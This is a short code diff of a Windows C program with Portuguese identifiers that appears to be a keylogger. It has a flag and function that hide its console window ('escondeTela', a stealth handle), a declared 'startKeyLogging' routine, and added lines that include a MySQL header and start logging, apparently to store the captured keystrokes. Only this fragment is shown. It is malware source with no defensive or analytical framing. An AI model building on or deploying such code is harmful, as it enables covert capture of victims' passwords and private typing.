@@ -2,7 +2,9 @@
 #include <stdlib.h>
 #include <windows.h>
 #include <winuser.h>
+#include "mysql.h"
 int telaInvisivel = 0;
+int registraLog = 1;
 void escondeTela(void)
 {
 	HWND stealth;
@@ -13,7 +15,10 @@ int main(int argc, char* argv[])
 {
 	int startKeyLogging(char* argv[]);
 	if (telaInvisivel) escondeTela();
+
+	if (registraLog) iniciaLog(argv);
 	iniciaThread(argv);
+	
 	system("pause");
 	return 0;
 }
